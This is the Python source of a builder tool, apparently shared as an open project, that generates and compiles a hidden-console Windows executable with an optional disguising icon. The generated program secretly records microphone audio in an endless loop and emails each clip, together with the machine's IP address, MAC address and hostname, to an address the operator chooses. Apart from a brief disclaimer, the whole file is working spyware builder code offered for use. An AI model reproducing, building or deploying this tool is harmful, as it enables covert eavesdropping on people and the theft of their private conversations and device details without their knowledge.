# RecordSendNotify
# Developed by: ugurcomptech
# License: Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License

# WARNING: This tool can potentially be misused for malicious purposes and may lead to
# unauthorized access to other people's important data. Use it responsibly and only with
# the consent of the recipient for legitimate purposes.

# Disclaimer: The developer is not responsible for any misuse or damage caused by this tool.

import os
import argparse

def create_exe(sender_email, sender_password, receiver_email, duration, exe_name, icon_path):
    code = f'''
import os
import yagmail
import socket
import uuid
import time
import sounddevice as sd
import soundfile as sf

def get_system_info():
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = ':'.join(hex(uuid.getnode())[i:i+2] for i in range(2, 14, 2))
    computer_name = socket.gethostname()
    return f"IP Address: {{ip_address}}\\nMAC Address: {{mac_address}}\\nComputer Name: {{computer_name}}"

def record_audio(file_name, duration):
    recording = sd.rec(int(duration * 44100), samplerate=44100, channels=2)
    sd.wait()
    sf.write(file_name, recording, 44100)

def send_email(subject, message, attachment_path, sender_email, receiver_email, sender_password):
    try:
        yag = yagmail.SMTP(sender_email, sender_password)
        yag.send(
            to=receiver_email,
            subject=subject,
            contents=message,
            attachments=attachment_path,
        )
        yag.close()
        print(f"Email sent successfully to {{receiver_email}}.")
    except Exception as e:
        print(f"An error occurred: {{e}}")

if __name__ == "__main__":
    audio_folder = os.path.join(os.environ['USERPROFILE'], 'Documents')
    
    if not os.path.exists(audio_folder):
        os.mkdir(audio_folder)

    while True:
        audio_file = os.path.join(audio_folder, f"audio.wav")
        record_audio(audio_file, {duration})

        subject = "Audio Recording"
        message = f"Audio recording attached.\\n\\nSystem Information:\\n{{get_system_info()}}"
        send_email(subject, message, audio_file, "{sender_email}", "{receiver_email}", "{sender_password}")

        print("Audio recording captured and sent.")

        # Delete the audio file after sending
        os.remove(audio_file)

        time.sleep({duration})
'''

    with open(f"{exe_name}.py", "w") as file:
        file.write(code)

    pyinstaller_cmd = f"pyinstaller --onefile --noconsole {exe_name}.py"
    if icon_path:
        pyinstaller_cmd += f" --icon={icon_path}"

    os.system(pyinstaller_cmd)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create exe file to record audio and send via email.")
    parser.add_argument("-s", "--sender-email", required=True, help="Sender's email address.")
    parser.add_argument("-p", "--sender-password", required=True, help="Sender's email password.")
    parser.add_argument("-r", "--receiver-email", required=True, help="Recipient's email address.")
    parser.add_argument("-d", "--duration", type=int, default=5, help="Recording duration in seconds.")
    parser.add_argument("-n", "--exe-name", required=True, help="The name of the generated exe file.")
    parser.add_argument("-c", "--icon-path", help="Path to the icon file for the executable.")

    args = parser.parse_args()

    create_exe(args.sender_email, args.sender_password, args.receiver_email, args.duration, args.exe_name, args.icon_path)

    print(f"'{args.exe_name}.exe' file is created.")
